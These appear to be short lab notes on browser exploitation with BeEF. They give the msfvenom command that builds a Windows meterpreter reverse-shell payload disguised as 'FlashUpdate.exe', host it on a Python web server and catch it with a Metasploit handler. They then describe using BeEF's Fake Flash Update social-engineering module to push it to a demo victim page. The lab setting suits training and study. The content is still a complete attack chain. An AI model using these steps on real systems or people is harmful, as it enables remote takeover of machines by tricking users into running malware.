# BeEF for browser exploitation notes

setup a msfvenom payload and host it with python webserver

```
msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=<IP> lport=<port> -f exe -o /tmp/FlashUpdate.exe
python3 -m http.server 
```

start handler

```
msfconsole -q
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <IP>
exploit
```

## Starting Beef

```
beef
```

interacting with beef

- go to the http://10.10.75.1:3000/demos/thetofuartist/index.html page as the victim
- sign into admin panel on the linux machine running beef
- go to the victim host you see in the admin panel, and go to commands in the middle pane
![image](https://github.com/user-attachments/assets/2893465d-cef6-4a71-b113-af67ea5f1ace)
- now select the Social Engineering folder and select Fake Flash Update
![image](https://github.com/user-attachments/assets/1504671d-c3f4-41a3-b3f0-cb7d7ae1074d)
- Now update the Custom payload URI and the image
  ![image](https://github.com/user-attachments/assets/a22dfeae-21d9-4b92-a6e2-f56b0e3b6703)
- go back to victim and run the update
